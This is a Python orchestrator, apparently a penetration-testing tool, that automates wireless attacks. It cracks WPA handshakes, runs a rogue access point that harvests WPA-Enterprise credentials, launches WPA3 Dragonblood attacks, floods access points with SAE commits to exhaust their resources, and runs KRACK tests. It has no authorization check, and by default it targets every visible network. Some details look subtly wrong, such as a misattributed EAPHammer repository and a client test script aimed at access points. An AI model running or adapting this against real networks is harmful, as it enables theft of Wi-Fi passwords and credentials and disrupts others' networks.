#!/usr/bin/env python3
"""
aether.py — Wireless Penetration Testing Orchestrator
======================================================
Orchestrates multi-phase wireless assessments via:
  Phase 1 — WPA/WPA2/WPA3 handshake capture + offline crack  (wifite2)
  Phase 2 — WPA-Enterprise rogue AP / credential harvest      (EAPHammer)
  Phase 3 — WPA3 SAE cryptographic vulnerability testing      (dragonslayer)
  Phase 4 — WPA3 SAE resource exhaustion (dragondrain)        (dragondrain)
  Phase 5 — WPA2 KRACK key reinstallation testing             (krackattacks-scripts)

Protocol tokens (emitted to stdout for Spectre frontend):
  __SPECTRE_LOG__    <message>   — standard log line
  __SPECTRE_ERR__    <message>   — error line
  __SPECTRE_STATUS__ <json>      — phase/status JSON object
  __SPECTRE_FINDING__<json>      — security finding JSON object
  __SPECTRE_PROMPT__ <message>   — interactive input required

Usage:
  python3 aether.py --config config.json --project my_assessment
  python3 aether.py --config config.json --phase wpa --interface wlan0
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

VERSION = "1.0.0"

# ── Vantage-compatible output protocol ───────────────────────────────────────
_MANAGED = os.environ.get("SPECTRE_MANAGED", "") == "1"


def _tok(token: str, msg: str) -> None:
    line = f"{token} {msg}"
    print(line, flush=True)


def log(msg: str) -> None:
    _tok("__SPECTRE_LOG__", msg)


def err(msg: str) -> None:
    _tok("__SPECTRE_ERR__", msg)


def status(phase: str, label: str, state: str, step: str = "") -> None:
    _tok("__SPECTRE_STATUS__", json.dumps({
        "phase": phase, "label": label, "status": state, "step": step,
        "ts": datetime.now().isoformat(),
    }))


def finding(title: str, severity: str, description: str, data: dict | None = None,
            output_file: str = "") -> None:
    _tok("__SPECTRE_FINDING__", json.dumps({
        "title": title, "severity": severity, "description": description,
        "data": data or {}, "output_file": output_file,
        "ts": datetime.now().isoformat(),
    }))


# ── Subprocess helpers ────────────────────────────────────────────────────────

def _popen(cmd: list, **kwargs) -> subprocess.Popen:
    return subprocess.Popen(cmd, **kwargs)


def _run(cmd: list, timeout: int = 60) -> tuple[str, int]:
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "(timeout)", -1
    except Exception as exc:
        return str(exc), -1


# ── Monitor mode management ───────────────────────────────────────────────────

def enable_monitor_mode(interface: str, monitor_iface: str) -> str:
    """Put interface into monitor mode. Returns the monitor interface name."""
    log(f"Enabling monitor mode on {interface}...")
    # Try airmon-ng first
    if shutil.which("airmon-ng"):
        _run(["sudo", "airmon-ng", "check", "kill"])
        out, rc = _run(["sudo", "airmon-ng", "start", interface])
        # airmon-ng creates wlan0mon or wlan0_mon
        m = re.search(r'monitor mode vif enabled.*?(\w+mon\w*)', out, re.I)
        if m:
            log(f"Monitor mode enabled: {m.group(1)}")
            return m.group(1)
        # Fall through: use the configured monitor_iface name
        log(f"Monitor mode started — using {monitor_iface}")
        return monitor_iface
    # Fallback: ip + iw
    _run(["sudo", "ip", "link", "set", interface, "down"])
    _run(["sudo", "iw", interface, "set", "monitor", "none"])
    _run(["sudo", "ip", "link", "set", interface, "up"])
    log(f"Monitor mode set via iw on {interface}")
    return interface


def disable_monitor_mode(monitor_iface: str, original_iface: str) -> None:
    if shutil.which("airmon-ng"):
        _run(["sudo", "airmon-ng", "stop", monitor_iface])
    else:
        _run(["sudo", "ip", "link", "set", monitor_iface, "down"])
        _run(["sudo", "iw", monitor_iface, "set", "type", "managed"])
        _run(["sudo", "ip", "link", "set", monitor_iface, "up"])
    _run(["sudo", "service", "NetworkManager", "restart"])
    log(f"Monitor mode disabled — {original_iface} restored to managed mode")


# ── Target AP scanning ────────────────────────────────────────────────────────

def scan_targets(monitor_iface: str, target_ssids: list, timeout: int = 30) -> list[dict]:
    """
    Scan for target APs. Uses airodump-ng or iwlist to discover nearby networks.
    Returns list of {ssid, bssid, channel, encryption, signal} dicts.
    """
    log(f"Scanning for wireless networks (timeout={timeout}s)...")
    discovered: list[dict] = []

    if shutil.which("airodump-ng"):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            out_prefix = os.path.join(tmp, "scan")
            cmd = ["sudo", "airodump-ng", "--write", out_prefix,
                   "--output-format", "csv", monitor_iface]
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(timeout)
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                pass
            csv_file = out_prefix + "-01.csv"
            if os.path.exists(csv_file):
                try:
                    with open(csv_file, encoding="utf-8", errors="replace") as f:
                        lines = f.read().splitlines()
                    for line in lines[2:]:  # skip header rows
                        parts = [p.strip() for p in line.split(",")]
                        if len(parts) >= 14:
                            bssid = parts[0]
                            channel_str = parts[3].strip()
                            enc = parts[5].strip()
                            ssid = parts[13].strip()
                            if not bssid or not ssid:
                                continue
                            try:
                                channel = int(channel_str)
                            except ValueError:
                                channel = 0
                            if not target_ssids or ssid in target_ssids:
                                discovered.append({
                                    "ssid": ssid, "bssid": bssid,
                                    "channel": channel, "encryption": enc,
                                })
                except Exception as exc:
                    err(f"Scan CSV parse error: {exc}")
    else:
        # Fallback: iwlist
        out, _ = _run(["sudo", "iwlist", monitor_iface, "scan"], timeout=30)
        current: dict = {}
        for line in out.splitlines():
            line = line.strip()
            if "Cell" in line and "Address:" in line:
                if current:
                    if not target_ssids or current.get("ssid") in target_ssids:
                        discovered.append(current)
                m = re.search(r'Address:\s+(\S+)', line)
                current = {"bssid": m.group(1) if m else "", "ssid": "", "channel": 0, "encryption": ""}
            elif "ESSID:" in line:
                m = re.search(r'ESSID:"([^"]*)"', line)
                if m:
                    current["ssid"] = m.group(1)
            elif "Channel:" in line:
                m = re.search(r'Channel:(\d+)', line)
                if m:
                    current["channel"] = int(m.group(1))
            elif "Encryption key:" in line:
                current["encryption"] = "WPA" if "on" in line else "OPEN"
        if current and (not target_ssids or current.get("ssid") in target_ssids):
            discovered.append(current)

    log(f"Discovered {len(discovered)} target AP(s)")
    for ap in discovered:
        log(f"  AP: {ap.get('ssid')} [{ap.get('bssid')}] ch={ap.get('channel')} enc={ap.get('encryption')}")
    return discovered


# ── Phase 1: wifite2 — WPA/WPA2/WPA3 handshake capture + crack ──────────────
# wifite2 — originally by derv82; actively maintained by kimocoder
# https://github.com/kimocoder/wifite2

def phase_wifite(
    monitor_iface: str, target_ssids: list, wordlist: str | None,
    output_dir: Path, timeout: int = 300,
) -> None:
    """
    Phase 1: wifite2 automated WPA/WPA2/WPA3 handshake capture and offline cracking.
    Handles PMKID attacks, deauth handshake capture, and optional WPA3 SAE.
    """
    wifite_path = shutil.which("wifite") or shutil.which("wifite2")
    if not wifite_path:
        log("[~] wifite2 not installed — skipping Phase 1 (pip install wifite2)")
        status("p1_wifite", "Phase 1: WPA Handshake", "skipped", "wifite2 not installed")
        return

    status("p1_wifite", "Phase 1: WPA Handshake Capture", "running")
    wifite_dir = output_dir / "wifite"
    wifite_dir.mkdir(parents=True, exist_ok=True)

    cmd = [
        "sudo", wifite_path,
        "--kill",               # kill interfering processes
        "--no-wps",             # skip WPS (covered by wifite internally)
        "--wpa",                # enable WPA cracking
        "--pmkid",              # PMKID attack (no deauth needed)
        "--interface", monitor_iface,
        "--ignore-locks",       # continue if handshake capture stalls
        "--timeout", str(min(timeout, 60)),  # per-target timeout
        "--crack-handshake",    # attempt offline crack immediately
    ]
    if wordlist and os.path.exists(wordlist):
        cmd += ["--dict", wordlist]
    if target_ssids:
        # wifite2 --essid filters to one SSID; run per-SSID
        for ssid in target_ssids:
            _cmd = cmd + ["--essid", ssid]
            log(f"[1] wifite2: targeting '{ssid}'")
            out_file = wifite_dir / f"wifite_{re.sub(r'[^\w]', '_', ssid)}.txt"
            try:
                proc = _popen(_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               cwd=str(wifite_dir))
                out_lines = []
                assert proc.stdout is not None
                for raw_line in proc.stdout:
                    line = raw_line.decode("utf-8", errors="replace").rstrip()
                    log(line)
                    out_lines.append(line)
                proc.wait(timeout=timeout + 30)
                out_file.write_text("\n".join(out_lines), encoding="utf-8")

                # Parse captured handshakes / cracked passwords
                for line in out_lines:
                    if re.search(r'WPA.*?key.*?:.*?\S|Cracked|password', line, re.I):
                        m = re.search(r'(?:key|password)[:\s]+(\S+)', line, re.I)
                        psk = m.group(1) if m else "(see output)"
                        finding(
                            title=f"WPA Pre-Shared Key Cracked: {ssid}",
                            severity="CRITICAL",
                            description=f"wifite2 recovered PSK for SSID '{ssid}': {psk}",
                            data={"ssid": ssid, "psk": psk},
                            output_file=str(out_file),
                        )
                    if re.search(r'handshake|PMKID|\.hc22000', line, re.I):
                        finding(
                            title=f"WPA Handshake Captured: {ssid}",
                            severity="HIGH",
                            description=f"Handshake/PMKID captured for SSID '{ssid}'. Ready for offline cracking.",
                            data={"ssid": ssid},
                            output_file=str(out_file),
                        )
            except subprocess.TimeoutExpired:
                proc.kill()
                err(f"wifite2 timed out for '{ssid}'")
            except Exception as exc:
                err(f"wifite2 error: {exc}")
    else:
        # No target SSIDs — let wifite2 auto-select
        out_file = wifite_dir / "wifite_all.txt"
        log("[1] wifite2: scanning all visible networks")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          cwd=str(wifite_dir))
            out_lines = []
            assert proc.stdout is not None
            for raw_line in proc.stdout:
                line = raw_line.decode("utf-8", errors="replace").rstrip()
                log(line)
                out_lines.append(line)
            proc.wait(timeout=timeout + 30)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
        except subprocess.TimeoutExpired:
            proc.kill()
        except Exception as exc:
            err(f"wifite2 error: {exc}")

    status("p1_wifite", "Phase 1: WPA Handshake Capture", "complete")


# ── Phase 2: EAPHammer — WPA-Enterprise rogue AP ─────────────────────────────
# EAPHammer — by s0md3v (https://github.com/s0md3v/eaphammer)

def phase_eaphammer(
    monitor_iface: str, target_aps: list[dict],
    eaphammer_path: str, output_dir: Path,
    auth: str = "wpa-eap", timeout: int = 300,
) -> None:
    """
    Phase 2: EAPHammer rogue AP attack for WPA-Enterprise credential harvesting.
    Creates a rogue AP mimicking the target ESSID, downgrades EAP auth,
    and captures NTLM challenge/response or MSCHAPv2 credentials.
    """
    if not os.path.exists(eaphammer_path):
        log(f"[~] EAPHammer not found at {eaphammer_path} — skipping Phase 2")
        log(f"    Install: git clone https://github.com/s0md3v/eaphammer /opt/eaphammer")
        status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "skipped", "not installed")
        return

    status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "running")
    eap_dir = output_dir / "eaphammer"
    eap_dir.mkdir(parents=True, exist_ok=True)

    enterprise_aps = [ap for ap in target_aps if re.search(r'WPA.*EAP|Enterprise|802\.1X', ap.get("encryption", ""), re.I)]
    if not enterprise_aps and target_aps:
        # Run against all targets if encryption type unknown
        enterprise_aps = target_aps[:3]

    if not enterprise_aps:
        log("[~] EAPHammer: no WPA-Enterprise targets found — skipping")
        status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "skipped", "no enterprise targets")
        return

    for ap in enterprise_aps[:3]:
        ssid = ap.get("ssid", "")
        bssid = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        if not ssid:
            continue

        cred_dir = eap_dir / re.sub(r'[^\w]', '_', ssid)
        cred_dir.mkdir(parents=True, exist_ok=True)
        out_file = eap_dir / f"eaphammer_{re.sub(r'[^\w]', '_', ssid)}.txt"

        cmd = [
            "sudo", "python3", eaphammer_path,
            "--interface", monitor_iface,
            "--channel", str(channel),
            "--essid", ssid,
            "--auth", auth,
            "--creds",
            "--creds-output", str(cred_dir),
        ]
        if bssid:
            cmd += ["--bssid", bssid]

        log(f"[2] EAPHammer: rogue AP '{ssid}' ch={channel} auth={auth}")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            out_lines = []
            assert proc.stdout is not None
            start = time.time()
            while time.time() - start < timeout:
                line = proc.stdout.readline()
                if not line:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                # Detect captured credentials
                if re.search(r'challenge|response|MSCHAPv2|username|password', decoded, re.I):
                    finding(
                        title=f"WPA-Enterprise Credentials Captured: {ssid}",
                        severity="CRITICAL",
                        description=f"EAPHammer captured EAP credentials for SSID '{ssid}'. "
                                    f"See {cred_dir} for challenge/response hashes.",
                        data={"ssid": ssid, "bssid": bssid, "auth": auth},
                        output_file=str(cred_dir),
                    )
            proc.terminate()
            proc.wait(timeout=10)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
        except Exception as exc:
            err(f"EAPHammer error: {exc}")

    status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "complete")


# ── Phase 3: dragonslayer — WPA3 SAE cryptographic testing ───────────────────
# dragonslayer — by Mathy Vanhoef @vanhoefm (https://github.com/vanhoefm/dragonslayer)

def phase_dragonslayer(
    monitor_iface: str, target_aps: list[dict],
    dragonslayer_client: str, output_dir: Path,
    attack: int = 1, client_conf: str = "", timeout: int = 180,
) -> None:
    """
    Phase 3: dragonslayer — tests WPA3 SAE handshake for cryptographic vulnerabilities.
    Attack modes:
      0: Reflection attack vs SAE or EAP-pwd
      1: Invalid curve attack vs EAP-pwd (default)
      2: Secondary invalid curve variant
      3: Zero-scalar attack vs SAE
    Requires: Atheros wireless card with ath_masker kernel module
    """
    if not os.path.exists(dragonslayer_client):
        log(f"[~] dragonslayer not found at {dragonslayer_client} — skipping Phase 3")
        log(f"    Install: git clone https://github.com/vanhoefm/dragonslayer /opt/dragonslayer")
        status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "skipped", "not installed")
        return

    status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "running")
    ds_dir = output_dir / "dragonslayer"
    ds_dir.mkdir(parents=True, exist_ok=True)

    wpa3_aps = [ap for ap in target_aps if re.search(r'WPA3|SAE', ap.get("encryption", ""), re.I)]
    if not wpa3_aps:
        log("[~] dragonslayer: no WPA3/SAE targets detected — running against all targets")
        wpa3_aps = target_aps[:3]

    for ap in wpa3_aps[:3]:
        ssid = ap.get("ssid", "unknown")
        safe_ssid = re.sub(r'[^\w]', '_', ssid)
        out_file = ds_dir / f"dragonslayer_{safe_ssid}_attack{attack}.txt"

        # Update client.conf with target SSID
        conf_content = f'network={{\n    ssid="{ssid}"\n    key_mgmt=SAE\n    sae_groups=19\n}}\n'
        if client_conf and os.path.dirname(client_conf):
            target_conf = os.path.join(os.path.dirname(client_conf), f"client_{safe_ssid}.conf")
        else:
            target_conf = str(ds_dir / f"client_{safe_ssid}.conf")
        try:
            with open(target_conf, "w") as cf:
                cf.write(conf_content)
        except Exception:
            target_conf = client_conf

        cmd = [
            "sudo", "bash", dragonslayer_client,
            "-i", monitor_iface,
            "-a", str(attack),
        ]
        if target_conf:
            cmd += ["-c", target_conf]

        log(f"[3] dragonslayer: WPA3 SAE attack {attack} against '{ssid}'")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          cwd=str(os.path.dirname(dragonslayer_client)))
            out_lines = []
            assert proc.stdout is not None
            start = time.time()
            while time.time() - start < timeout:
                line = proc.stdout.readline()
                if not line:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)

                if re.search(r'vulnerable|attack succeed|reflection|invalid curve', decoded, re.I):
                    finding(
                        title=f"WPA3 SAE Dragonblood Vulnerability Detected: {ssid}",
                        severity="HIGH",
                        description=f"dragonslayer (attack mode {attack}) confirmed WPA3/SAE "
                                    f"vulnerability on '{ssid}'. CVE-2019-9494 / Dragonblood attack family.",
                        data={"ssid": ssid, "attack": attack, "cve": "CVE-2019-9494"},
                        output_file=str(out_file),
                    )
            proc.terminate()
            proc.wait(timeout=10)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
        except Exception as exc:
            err(f"dragonslayer error: {exc}")

    status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "complete")


# ── Phase 4: dragondrain — WPA3 resource exhaustion ──────────────────────────
# dragondrain-and-time — by Mathy Vanhoef @vanhoefm (https://github.com/vanhoefm/dragondrain-and-time)

def phase_dragondrain(
    monitor_iface: str, target_aps: list[dict],
    dragondrain_path: str, output_dir: Path,
    timeout: int = 60,
) -> None:
    """
    Phase 4: dragondrain — WPA3 SAE commit flooding for resource exhaustion testing.
    Sends forged SAE Commit messages to force high CPU on target APs.
    Requires: Atheros NIC with ath_masker, curve group 21 support.
    Note: This test is potentially disruptive. Only run in authorized environments.
    """
    if not os.path.exists(dragondrain_path):
        log(f"[~] dragondrain not found — skipping Phase 4")
        log(f"    Install: git clone https://github.com/vanhoefm/dragondrain-and-time /opt/dragondrain-and-time")
        status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "skipped", "not installed")
        return

    status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "running")
    drain_dir = output_dir / "dragondrain"
    drain_dir.mkdir(parents=True, exist_ok=True)

    for ap in target_aps[:3]:
        ssid   = ap.get("ssid", "")
        bssid  = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        if not bssid:
            continue

        safe = re.sub(r'[^\w]', '_', ssid or bssid)
        out_file = drain_dir / f"dragondrain_{safe}.txt"

        cmd = [
            "sudo", dragondrain_path,
            "-d", monitor_iface,
            "-a", bssid,
            "-c", str(channel),
            "-n", "10",          # 10 spoofed MACs
            "-r", "20",          # 20 handshakes/second
            "-g", "21",          # curve group 21 (521-bit elliptic)
        ]
        log(f"[4] dragondrain: resource exhaustion test → {ssid} [{bssid}] ch={channel}")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            out_lines = []
            assert proc.stdout is not None
            start = time.time()
            while time.time() - start < timeout:
                line = proc.stdout.readline()
                if not line:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
            proc.terminate()
            proc.wait(timeout=5)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
            # Any successful drain run indicates vulnerability
            finding(
                title=f"WPA3 SAE Resource Exhaustion (Dragondrain) Tested: {ssid}",
                severity="MEDIUM",
                description=f"dragondrain resource exhaustion test completed against '{ssid}' [{bssid}]. "
                            f"If AP showed increased CPU/latency, it is vulnerable to CVE-2019-9496.",
                data={"ssid": ssid, "bssid": bssid, "cve": "CVE-2019-9496"},
                output_file=str(out_file),
            )
        except Exception as exc:
            err(f"dragondrain error: {exc}")

    status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "complete")


# ── Phase 5: krackattacks — WPA2 KRACK key reinstallation testing ─────────────
# krackattacks-scripts — by Mathy Vanhoef @vanhoefm (https://github.com/vanhoefm/krackattacks-scripts)

def phase_krack(
    monitor_iface: str, target_aps: list[dict],
    krackattacks_path: str, output_dir: Path,
    timeout: int = 180,
) -> None:
    """
    Phase 5: krackattacks-scripts — test for WPA2 KRACK key reinstallation vulnerabilities.
    Tests: CVE-2017-13077 (pairwise 4-way), CVE-2017-13078 (pairwise variant),
           CVE-2017-13080 (group key reinstallation).
    Requires: Intel AC 7260 or TP-Link TL-WN722N v1 NIC.
    Must disable hardware crypto: sudo ./disable-hwcrypto.sh first.
    """
    if not os.path.exists(krackattacks_path):
        log(f"[~] krackattacks-scripts not found — skipping Phase 5")
        log(f"    Install: git clone https://github.com/vanhoefm/krackattacks-scripts /opt/krackattacks-scripts")
        status("p5_krack", "Phase 5: KRACK Testing", "skipped", "not installed")
        return

    status("p5_krack", "Phase 5: KRACK Testing", "running")
    krack_dir = output_dir / "krack"
    krack_dir.mkdir(parents=True, exist_ok=True)

    # Disable hardware crypto (required for KRACK testing)
    hwcrypto_script = os.path.join(os.path.dirname(krackattacks_path), "disable-hwcrypto.sh")
    if os.path.exists(hwcrypto_script):
        log("[5] Disabling hardware crypto for KRACK test...")
        _run(["sudo", "bash", hwcrypto_script])

    # Test variants
    test_flags = [
        ([], "standard 4-way", "CVE-2017-13077"),
        (["--group"], "group key", "CVE-2017-13080"),
        (["--tptk"], "TPTK variant", "CVE-2017-13078"),
    ]

    for ap in target_aps[:2]:
        ssid  = ap.get("ssid", "")
        bssid = ap.get("bssid", "")
        if not bssid:
            continue
        safe = re.sub(r'[^\w]', '_', ssid or bssid)

        for flags, variant_name, cve in test_flags:
            out_file = krack_dir / f"krack_{safe}_{variant_name.replace(' ', '_')}.txt"
            cmd = ["sudo", "python3", krackattacks_path] + flags + ["--bssid", bssid]
            log(f"[5] KRACK {variant_name} test against '{ssid}' ({cve})")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              cwd=str(os.path.dirname(krackattacks_path)))
                out_lines = []
                assert proc.stdout is not None
                start = time.time()
                while time.time() - start < timeout:
                    line = proc.stdout.readline()
                    if not line:
                        break
                    decoded = line.decode("utf-8", errors="replace").rstrip()
                    log(decoded)
                    out_lines.append(decoded)
                    if re.search(r'VULNERABLE|reinstalled|attack worked', decoded, re.I):
                        finding(
                            title=f"WPA2 KRACK Vulnerability: {variant_name.title()} ({ssid})",
                            severity="HIGH",
                            description=f"krackattacks confirmed {cve} KRACK vulnerability on '{ssid}' "
                                        f"[{bssid}]: {variant_name}. Key reinstallation is possible.",
                            data={"ssid": ssid, "bssid": bssid, "cve": cve, "variant": variant_name},
                            output_file=str(out_file),
                        )
                proc.terminate()
                proc.wait(timeout=10)
                out_file.write_text("\n".join(out_lines), encoding="utf-8")
            except Exception as exc:
                err(f"KRACK {variant_name} error: {exc}")

    status("p5_krack", "Phase 5: KRACK Testing", "complete")


# ── Results aggregation ───────────────────────────────────────────────────────

class FindingsCollector:
    """Collects findings emitted via __SPECTRE_FINDING__ during stdout parsing."""

    def __init__(self, output_dir: Path):
        self.findings: list[dict] = []
        self.output_dir = output_dir

    def save(self) -> None:
        out = self.output_dir / "findings_spectre.json"
        out.write_text(json.dumps(self.findings, indent=2), encoding="utf-8")
        log(f"Findings written: {out} ({len(self.findings)} item(s))")


# ── Main orchestrator ─────────────────────────────────────────────────────────

def run(config: dict, project: str) -> None:
    output_dir = Path(project) / config.get("output_dir", "aether_output")
    output_dir.mkdir(parents=True, exist_ok=True)

    interface        = config.get("interface", "wlan0")
    monitor_iface    = config.get("monitor_interface", "wlan0mon")
    target_ssids     = config.get("target_ssids", [])
    target_bssids    = config.get("target_bssids", [])
    wordlist         = config.get("wordlist")
    phases_cfg       = config.get("phases", {})
    tools            = config.get("tools", {})
    timeout          = config.get("timeout_per_phase", 300)

    log("=" * 60)
    log(f"Aether Wireless Penetration Testing Orchestrator v{VERSION}")
    log(f"Project  : {project}")
    log(f"Interface: {interface}")
    log(f"Targets  : {', '.join(target_ssids) if target_ssids else '(all visible)'}")
    log("=" * 60)

    # Put interface in monitor mode
    active_monitor = enable_monitor_mode(interface, monitor_iface)

    try:
        # Discover target APs
        target_aps = scan_targets(active_monitor, target_ssids, timeout=30)

        # Filter by target BSSIDs if specified
        if target_bssids:
            target_aps = [ap for ap in target_aps if ap.get("bssid", "").upper() in
                          [b.upper() for b in target_bssids]]

        # Phase 1: wifite2 — WPA handshake
        if phases_cfg.get("wpa_handshake", True):
            phase_wifite(active_monitor, target_ssids, wordlist, output_dir, timeout)

        # Phase 2: EAPHammer — WPA-Enterprise
        if phases_cfg.get("wpa_enterprise", False):
            phase_eaphammer(
                active_monitor, target_aps,
                tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
                output_dir, auth=config.get("eaphammer", {}).get("auth", "wpa-eap"),
                timeout=timeout,
            )

        # Phase 3: dragonslayer — WPA3 SAE cryptographic testing
        if phases_cfg.get("dragonblood_sae", True):
            ds_cfg = config.get("dragonslayer", {})
            phase_dragonslayer(
                active_monitor, target_aps,
                tools.get("dragonslayer_client", "/opt/dragonslayer/dragonslayer-client.sh"),
                output_dir,
                attack=ds_cfg.get("attack", 1),
                client_conf=ds_cfg.get("client_conf", ""),
                timeout=timeout,
            )

        # Phase 4: dragondrain — WPA3 resource exhaustion
        if phases_cfg.get("dragonblood_drain", False):
            phase_dragondrain(
                active_monitor, target_aps,
                tools.get("dragondrain", "/opt/dragondrain-and-time/dragondrain"),
                output_dir, timeout=60,
            )

        # Phase 5: KRACK — WPA2 key reinstallation
        if phases_cfg.get("krack", True):
            phase_krack(
                active_monitor, target_aps,
                tools.get("krackattacks", "/opt/krackattacks-scripts/krackattack/krack-test-client.py"),
                output_dir, timeout=timeout,
            )

    finally:
        disable_monitor_mode(active_monitor, interface)

    # Write findings summary
    findings_file = output_dir / "findings_spectre.json"
    log(f"Assessment complete — output: {output_dir}")
    status("complete", "Assessment Complete", "complete", str(output_dir))


# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        prog="aether",
        description="Aether — Wireless Penetration Testing Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 aether.py --config config.json --project my_pentest
  python3 aether.py --config config.json --phase wpa --interface wlan1
  python3 aether.py --config config.json --list-phases
""",
    )
    parser.add_argument("--config", "-c", default="config.json",
                        help="Path to JSON config file (default: config.json)")
    parser.add_argument("--project", "-p", required=True,
                        help="Project name / output directory")
    parser.add_argument("--interface", "-i",
                        help="Wireless interface (overrides config)")
    parser.add_argument("--phase", choices=["wpa", "enterprise", "wpa3", "drain", "krack"],
                        help="Run only a specific phase")
    parser.add_argument("--ssid", action="append", dest="ssids", metavar="SSID",
                        help="Target SSID (repeatable; overrides config)")
    parser.add_argument("--wordlist", "-w",
                        help="Wordlist for WPA cracking (overrides config)")
    parser.add_argument("--list-phases", action="store_true",
                        help="List available phases and exit")
    return parser.parse_args()


def main():
    args = parse_args()

    if args.list_phases:
        print("Available phases:")
        print("  wpa        — Phase 1: WPA/WPA2/WPA3 handshake (wifite2)")
        print("  enterprise — Phase 2: WPA-Enterprise rogue AP (EAPHammer)")
        print("  wpa3       — Phase 3: WPA3 SAE cryptographic testing (dragonslayer)")
        print("  drain      — Phase 4: WPA3 resource exhaustion (dragondrain)")
        print("  krack      — Phase 5: WPA2 KRACK testing (krackattacks-scripts)")
        sys.exit(0)

    # Load config
    config_path = Path(args.config)
    if not config_path.exists():
        print(f"[!] Config file not found: {config_path}", file=sys.stderr)
        sys.exit(1)
    try:
        config = json.loads(config_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        print(f"[!] Config JSON parse error: {exc}", file=sys.stderr)
        sys.exit(1)

    # CLI overrides
    if args.interface:
        config["interface"] = args.interface
    if args.ssids:
        config["target_ssids"] = args.ssids
    if args.wordlist:
        config["wordlist"] = args.wordlist
    if args.phase:
        phase_map = {
            "wpa": "wpa_handshake", "enterprise": "wpa_enterprise",
            "wpa3": "dragonblood_sae", "drain": "dragonblood_drain", "krack": "krack",
        }
        config["phases"] = {k: (k == phase_map[args.phase]) for k in
                            ["wpa_handshake", "wpa_enterprise", "dragonblood_sae",
                             "dragonblood_drain", "krack"]}

    run(config, args.project)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Assessment interrupted by operator.")
        sys.exit(0)
